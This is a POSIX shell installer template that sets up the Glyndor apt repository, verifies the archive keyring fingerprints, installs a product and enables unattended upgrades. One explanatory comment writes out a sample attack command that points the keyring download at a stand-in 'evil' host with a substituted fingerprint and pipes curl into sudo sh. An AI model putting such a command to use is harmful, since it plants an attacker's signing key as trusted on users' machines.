#!/bin/sh
# Set up the Glyndor apt repository and install @PRODUCT@.
#
# Usage: ./install.sh
#
# Generated from scripts/install-template.sh in Glyndor/apt. Do not edit the
# published copy - edit the template.
#
# @PRODUCT@ ships as a signed .deb, so apt is the install: it verifies every
# package on every upgrade rather than once, and `apt upgrade` is what keeps the
# machine current. A binary dropped somewhere by hand stays on the version it
# was installed at until somebody remembers it.
#
# Installing through apt also brings in whatever @PRODUCT@ recommends, because
# apt installs Recommends by default. This sentence used to name podman and
# podup specifically: true of epistle, which was the only product generated
# from this template at the time, and false the moment the template rendered
# for anything else - podup recommends podman alone, so its own installer would
# have claimed that installing podup brings podup in.
set -eu

KEYRING_URL="${KEYRING_URL:-https://apt.glyndor.net/glyndor-archive-keyring.deb}"
KEYRING_PATH="/usr/share/keyrings/glyndor.gpg"

# Fingerprint of the archive signing key. Downloading the keyring package is the
# one step that has nothing but the transport behind it; checking what it
# installed against this constant is what closes that window. Override for a
# fork with GLYNDOR_APT_FPR.
#
# Spaces are stripped and the value is upper-cased before it is compared, so
# the grouped form gpg prints and the README publishes -- "9ADF 04EA ..." --
# can be pasted straight in. Without that, a fork operator copying the
# published fingerprint gets "does not carry the expected fingerprint", which
# points at the key when the fault is the spaces.
GLYNDOR_APT_FPR="${GLYNDOR_APT_FPR:-9ADF04EA8C3139CDB67303CFA6705C2EA153F3D6}"

# Where the automatic-upgrade settings are written. Overridable so the tests can
# exercise the block for real instead of against a copy of it, which is how the
# block came to have no test at all: it writes as root into /etc, so a suite
# that is not root could only skip it.
#
# This one carries none of the risk the two overrides above carry. They decide
# what is trusted; this only decides where two config files land, and anyone who
# can set it can already run anything. It is still worth naming rather than
# leaving as an undocumented seam.
APT_CONF_D="${APT_CONF_D:-/etc/apt/apt.conf.d}"

# Both overrides above exist for forks and both are silent, which is the part
# worth changing. The attack they enable is not "someone controls your shell" --
# anyone who does needs no override. It is a copied command line:
#
#   KEYRING_URL=http://evil/x.deb GLYNDOR_APT_FPR=DEAD... \
#     curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh
#
# The visible URL is the real one. Everything that would have made the
# substitution obvious is in the environment, off the end of what a reader
# checks.
#
# Blocking the override would break the fork it was written for, so instead say
# what is in use. A line on the screen does not stop anyone determined; it
# removes the case where the substitution is invisible to someone who would have
# noticed it.
DEFAULT_URL="https://apt.glyndor.net/glyndor-archive-keyring.deb"
DEFAULT_FPR="9ADF04EA8C3139CDB67303CFA6705C2EA153F3D6"
url_overridden=no
fpr_overridden=no
[ "$KEYRING_URL" = "$DEFAULT_URL" ] || url_overridden=yes
[ "$(printf '%s' "$GLYNDOR_APT_FPR" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')" \
	= "$DEFAULT_FPR" ] || fpr_overridden=yes

# --- output ------------------------------------------------------------------
#
# This runs under `curl ... | sudo sh`, so stdout is the user's terminal even
# though stdin is a pipe. That makes styled output safe here, but only after
# three separate opt-outs, and every one of them is somebody real:
#
#   [ -t 1 ]        redirected to a file, or read by another program. Escape
#                   sequences written there are not decoration, they are
#                   corruption of text somebody greps later.
#   NO_COLOR        the convention a user sets once for every tool on a machine.
#   TERM=dumb       what emacs shells and some CI runners report.
#
if [ -t 1 ] && [ -z "${NO_COLOR-}" ] && [ "${TERM-}" != dumb ]; then
	ESC="$(printf '\033')"
	DIM="${ESC}[2m"; BOLD="${ESC}[1m"; GREEN="${ESC}[32m"
	RED="${ESC}[31m"; OFF="${ESC}[0m"; CLR="${ESC}[2K"
else
	DIM=""; BOLD=""; GREEN=""; RED=""; OFF=""; CLR=""
fi

# The glyphs are U+2714 and U+2716. On a machine whose locale is not UTF-8 those
# bytes render as mojibake, so the test is on the charset rather than on the
# terminal -- it is the locale that decides whether the glyph arrives intact,
# and a Docker image with no locales set is the common case, not an exotic one.
case "${LC_ALL:-${LC_CTYPE:-${LANG-}}}" in
	*UTF-8*|*utf8*|*UTF8*) TICK="✔"; CROSS="✖"; DOT="·" ;;
	*)                     TICK="+"; CROSS="!"; DOT="-" ;;
esac

# %b is what expands the colour variables: POSIX printf does not interpret
# escapes inside %s, and `echo -e` is not portable to dash, which is the shell
# that actually runs this on Debian and Ubuntu.
#
# A step with no value prints no padding and no empty colour pair. Trailing
# whitespace and a bare reset are invisible on a terminal and are exactly what
# somebody diffing two install logs sees as a change that is not there.
step() {
	[ -n "$CLR" ] && printf '\r%b' "$CLR"
	if [ -n "${2-}" ]; then
		printf '  %b%s%b %-32s%b%s%b\n' "$GREEN" "$TICK" "$OFF" "$1" "$DIM" "$2" "$OFF"
	else
		printf '  %b%s%b %s\n' "$GREEN" "$TICK" "$OFF" "$1"
	fi
}

# Only on a terminal, and deliberately not a spinner: this line is overwritten
# by the next step(), so anything that survives into a log file would be a
# half-finished sentence claiming work that may not have happened.
doing() { [ -n "$CLR" ] || return 0; printf '  %b%s %s%b' "$DIM" "$DOT" "$1" "$OFF"; }

note() { printf '      %b%s%b\n' "$DIM" "$1" "$OFF"; }

banner() { printf '\n  %b%s%b %s %b%s%b\n\n' "$BOLD" "Glyndor" "$OFF" "$DOT" "$BOLD" "$1" "$OFF"; }
closing() { printf '\n  %b%s%b %s %b%s%b\n\n' "$BOLD" "$1" "$OFF" "$DOT" "$DIM" "$2" "$OFF"; }

fail() {
	[ -n "$CLR" ] && printf '\r%b' "$CLR"
	printf '  %b%s%b %s\n' "$RED" "$CROSS" "$OFF" "error: $1" >&2
	exit 1
}
# --- end output --------------------------------------------------------------

[ "$(id -u)" -eq 0 ] || fail "run this as root: curl -fsSL https://apt.glyndor.net/install/@PRODUCT@ | sudo sh"

command -v apt-get >/dev/null 2>&1 \
	|| fail "no apt-get found. @PRODUCT@ ships as a .deb; on a non-Debian system, build from source (https://github.com/Glyndor/@PRODUCT@)"
command -v dpkg >/dev/null 2>&1 || fail "no dpkg found"
# dpkg-deb ships inside the dpkg package, so this guard is redundant on a sane
# system. It is here so that a stripped-down image fails with a clear message
# instead of "dpkg-deb: command not found" halfway through the keyring step.
command -v dpkg-deb >/dev/null 2>&1 || fail "no dpkg-deb found"

workdir=
installed_gnupg=

# Leaves nothing of its own behind, on every exit path including the failures:
# the downloaded keyring package, and gnupg if this script is what pulled it in.
cleanup() {
	[ -n "$workdir" ] && rm -rf "$workdir"
	if [ -n "$installed_gnupg" ]; then
		note "removing the gnupg this script installed"
		apt-get purge -y -qq --auto-remove gnupg >/dev/null 2>&1 || true
	fi
	return 0
}
trap cleanup EXIT

# gpg comes from the distribution's own trusted repositories, not ours, so
# installing it here does not widen what has to be trusted. It is needed for one
# fingerprint read and nothing else, so it goes back out again afterwards -
# purged with --auto-remove, and only when it was absent to begin with.
if ! command -v gpg >/dev/null 2>&1; then
	doing "installing gnupg, needed to check the archive key"
	apt-get update -qq
	apt-get install -y -qq gnupg || fail "could not install gnupg"
	installed_gnupg=yes
fi

workdir=$(mktemp -d)

# Printed after the tool checks, so the message lands on a machine that can act
# on it rather than scrolling past a "no apt-get found" a moment later.
if [ "$url_overridden" = yes ] || [ "$fpr_overridden" = yes ]; then
	echo "NOTE: this is not the stock Glyndor install." >&2
	[ "$url_overridden" = no ] || echo "  keyring source: $KEYRING_URL (default is $DEFAULT_URL)" >&2
	[ "$fpr_overridden" = no ] || echo "  expected key:   $GLYNDOR_APT_FPR (default is $DEFAULT_FPR)" >&2
	if [ "$url_overridden" = yes ] && [ "$fpr_overridden" = yes ]; then
		echo "  Both were replaced, so nothing here is checked against Glyndor's" >&2
		echo "  published key. That is correct for a fork and wrong for anything else." >&2
	fi
fi

banner "@PRODUCT@"
doing "downloading the archive keyring"
# Bounded, and redirects kept on https.
#
# The keyring is ~2 KB and stays kilobytes even carrying both keys through a
# rotation, so 8 MB is four thousand times the real size and still refuses a
# server that answers a 2 KB request with an endless body. Without it the only
# limit is the disk: this runs as root, and /tmp filling up takes the machine
# with it, before any fingerprint is ever compared.
#
# --proto-redir=https keeps -L from being talked down to http:// by a redirect.
# The fingerprint check would still refuse whatever arrived, but there is no
# reason to fetch a trust anchor over a downgraded connection to find out.
curl -fsSL --proto-redir =https --max-filesize $((8 * 1024 * 1024)) \
	-o "$workdir/glyndor-archive-keyring.deb" "$KEYRING_URL" \
	|| fail "could not download $KEYRING_URL (over 8 MB, or the transfer failed)"

# Extract WITHOUT installing. `dpkg-deb -x` unpacks the data archive and runs no
# maintainer script, so nothing from the downloaded package executes until its
# key has been checked. `dpkg -i` here would run preinst/postinst as root, and
# those scripts can write the very keyring the check below reads -- with the
# expected fingerprint alongside an attacker's, which the presence test admits.
# Normalise here rather than where the constant is set: `tr` must not be
# needed before the guards above have established that this is a Debian system
# with the tools the installer uses. Reaching for a command ahead of the check
# that the environment has it is how a "no apt-get found" refusal turns into
# "tr: command not found".
# One fingerprint per line, spaces stripped and upper-cased, so the grouped form
# gpg prints can be pasted in and several can be given separated by commas.
GLYNDOR_APT_FPR="$(printf '%s' "$GLYNDOR_APT_FPR" \
	| tr ',' '\n' | tr -d '[:blank:]' | tr '[:lower:]' '[:upper:]' | grep -v '^$')"

step "Archive keyring downloaded"
doing "checking the archive key fingerprint"
mkdir -p "$workdir/extracted"
dpkg-deb -x "$workdir/glyndor-archive-keyring.deb" "$workdir/extracted" \
	|| fail "could not extract the keyring package"

# EVERY key in the keyring must be one this installer was told to expect, not
# just one of them. The presence test this replaces admitted a keyring that
# carried the published key alongside an attacker's: apt then trusted both, and
# the sources.list the same package installs decides where it fetches from. That
# is what an attacker who can serve this .deb needs, and the published
# fingerprint does not stop it, because the published fingerprint is right there.
#
# A rotation still works: during the overlap the keyring carries the old key and
# the new one, so GLYNDOR_APT_FPR carries both. The order matters now -- publish
# both fingerprints BEFORE publishing the keyring that carries both, or clients
# refuse the new keyring until the second one is out.
#
# Only primary fingerprints are compared. `--with-colons` emits an `fpr:` line
# per subkey as well, and a subkey's fingerprint is not something anyone
# publishes; taking the first `fpr:` after each `pub:` is what isolates them.
keyring_fprs="$(gpg --show-keys --with-colons "$workdir/extracted$KEYRING_PATH" 2>/dev/null \
	| awk -F: '/^pub:/{want=1;next} /^fpr:/{if(want){print $10;want=0}}')"

# Do not remove this guard on the grounds that `set -e` covers it. It does not,
# and the reason is the interpreter rather than the logic.
#
# This is the only script here with a `#!/bin/sh` line, because it is fetched
# and piped into `sh`; every other script in this repository is bash and runs
# with `set -euo pipefail`. `pipefail` is not POSIX. It reached dash in 0.5.12,
# released in 2023, and this archive serves distributions older than that, so
# the option cannot be set here.
#
# Without it a pipeline exits with the status of its LAST command. In the
# assignment above, a gpg that fails writes nothing to stdout, its stderr is
# discarded, awk then reads empty input and exits 0, and the pipeline exits 0.
# `set -e` sees success. `keyring_fprs` is empty, the `for` loop below iterates
# zero times, every comparison it would have made is skipped, and the script
# walks into `dpkg -i` having verified nothing.
#
# This line is what turns that into a refusal.
[ -n "$keyring_fprs" ] \
	|| fail "the downloaded package carries no archive key at all; nothing was installed"

for fpr in $keyring_fprs; do
	printf '%s\n' "$GLYNDOR_APT_FPR" | grep -qxF "$fpr" || fail \
		"the downloaded keyring carries a key this installer was not told to expect ($fpr); nothing was installed"
done

# The fingerprint is printed rather than folded into the tick above. It is the
# one line of this output that a reader is asked to act on -- comparing it
# against README.md is what distinguishes this archive from one impersonating
# it -- and a check nobody can see is a check nobody performs.
step "Key fingerprint verified"
printf '%s\n' "$GLYNDOR_APT_FPR" | while IFS= read -r f; do
	[ -n "$f" ] || continue
	note "$(printf '%s' "$f" | sed -E 's/(.{4})/\1 /g; s/ $//; s/^(([0-9A-F]{4} ){5})/\1 /')"
done
doing "installing the keyring"
dpkg -i "$workdir/glyndor-archive-keyring.deb" >/dev/null \
	|| fail "could not install the keyring package"

step "Keyring installed"

# apt's own output is the bulk of what this script used to put on screen, and
# almost none of it is about @PRODUCT@: the dependency solver, the autoremove
# hint, and one `N:` line per unrelated file some other vendor left in
# sources.list.d. It is captured and shown only if apt fails, where it is the
# whole diagnosis.
#
# DEBIAN_FRONTEND matters specifically because the output is hidden. Without
# it, a package whose maintainer script asks debconf a question waits for an
# answer behind a screen showing nothing, which reads as a hang.
# Deliberately not -qq on the install. Capturing the output is what keeps the
# ordinary run quiet, so -qq buys nothing there and costs the whole diagnosis
# here: it suppresses the "unmet dependencies" block, leaving only
#
#     E: Unable to correct problems, you have held broken packages.
#
# which does not name the dependency that was not satisfiable. Measured on a
# machine whose podman was older than the Depends asks for -- the line that says
# WHICH package and WHICH version is the line -qq removes.
doing "installing @PRODUCT@"
if ! apt_log="$(DEBIAN_FRONTEND=noninteractive apt-get update -qq 2>&1 \
	&& DEBIAN_FRONTEND=noninteractive apt-get install -y @PRODUCT@ 2>&1)"; then
	# Clear the in-progress line before apt's own output lands, or the two
	# collide on one row and the first thing a reader sees is a sentence
	# spliced out of two programs.
	[ -n "$CLR" ] && printf '\r%b' "$CLR"
	printf '%s\n' "$apt_log" >&2
	fail "apt could not install @PRODUCT@"
fi

# Run the installed binary rather than asking dpkg what version it recorded.
# dpkg answers from its database, so it would report a version for a package
# that unpacked but cannot start; this is the one step that proves what landed
# actually runs. Its last field is the version, and an empty result is left
# empty rather than guessed -- a blank column is honest, an invented one is not.
version_line="$(@PRODUCT@ --version 2>/dev/null || true)"
version="${version_line##* }"
step "@PRODUCT@ installed" "$version"

# Automatic upgrades.
#
# The keyring package puts this archive on unattended-upgrades' allowlist, which
# is the part that is ours to decide. Whether the machine runs unattended
# upgrades at all is the operator's, and the two cases are handled differently
# on purpose.
#
# Debian ships neither the package nor the `20auto-upgrades` switch that turns
# it on, so on a fresh Debian the allowlist entry alone does nothing. Ubuntu
# server ships both.
# The question this asks is "is the switch off", not "is the package absent".
#
# It used to ask the second one, with `dpkg -s unattended-upgrades`, and that
# worked only while no product on this archive pulled the package in. It stopped
# being a safe proxy the moment one did: `apt-get install @PRODUCT@` above runs
# twelve lines before this test, and this script passes no
# `--no-install-recommends`, so a product that merely *recommends*
# unattended-upgrades installs it too. The test would then be true on a machine
# that had never seen the package, the else branch below would become
# unreachable, and the installer would print "leaving its settings alone" and
# exit 0 having switched nothing on. Reported from Glyndor/podup, whose
# `debian/control` on develop now reads `Depends: … unattended-upgrades`.
#
# The consequence was not only the missing switch. `52glyndor-safety` below, the
# file that stops an unattended upgrade rebooting a server on its own, is
# written in the same branch and would have gone with it.
#
# What this costs, stated because it is a real change and not a pure fix: an
# operator who installed unattended-upgrades and deliberately left it switched
# off now gets it switched on. File absence cannot distinguish "never chose"
# from "chose no". That case is accepted here because the README promises this
# script switches automatic security upgrades on, and because the settings below
# live in their own file precisely so one `rm` undoes them.
if [ -f "$APT_CONF_D"/20auto-upgrades ]; then
	# The switch is already on, so this machine's schedule is the operator's.
	# The keyring's allowlist entry is appended to their list rather than
	# replacing it, so Glyndor packages are already covered by whatever they
	# chose. Nothing to change, and changing it would be presumptuous.
	step "Automatic security upgrades" "already on, left alone"
else
	doing "switching on automatic security upgrades"
	# Installs the package when it is absent, and succeeds trivially when
	# something already pulled it in, which is the case that used to be
	# mistaken for "the operator configured this".
	if apt-get install -y -qq unattended-upgrades; then
		if [ ! -f "$APT_CONF_D"/20auto-upgrades ]; then
			cat > "$APT_CONF_D"/20auto-upgrades <<'CONF'
APT::Periodic::Update-Package-Lists "1";
APT::Periodic::Unattended-Upgrade "1";
CONF
		fi
		# Conservative for a server that answers on the public internet. Written
		# in its own file rather than by editing Debian's 50unattended-upgrades,
		# so an operator can drop it with one rm and dpkg never fights over it.
		cat > "$APT_CONF_D"/52glyndor-safety <<'CONF'
// Written by the Glyndor installer, because it found automatic upgrades
// switched off and switched them on. If `20auto-upgrades` had already been
// there, this file would not exist and your settings would have been left
// alone. Delete it to drop these three settings; nothing here rewrites
// Debian's own 50unattended-upgrades, so dpkg never fights over it.
//
// Never reboot on its own. A service dropping at 06:00 because a kernel landed
// is worse than the delay of a planned reboot, and the operator is the one who
// knows when that window is.
Unattended-Upgrade::Automatic-Reboot "false";

// Upgrade in small steps so an interrupted run leaves a working dpkg state
// rather than a half-configured one.
Unattended-Upgrade::MinimalSteps "true";

// Leave removals to the operator. Automatic dependency and kernel cleanup is
// the part of unattended-upgrades most likely to surprise someone.
Unattended-Upgrade::Remove-Unused-Dependencies "false";
Unattended-Upgrade::Remove-Unused-Kernel-Packages "false";
CONF
		step "Automatic security upgrades" "on, no automatic reboot"
	else
		printf '  %b%s%b %-32s%b%s%b\n' "$RED" "$CROSS" "$OFF" \
			"Automatic security upgrades" "$DIM" "could not be switched on" "$OFF" >&2
		note "@PRODUCT@ will not receive security fixes on its own" >&2
		note "sudo apt install unattended-upgrades" >&2
	fi
fi

closing "@PRODUCT@ $version" "upgrades and archive-key renewals both arrive through apt"
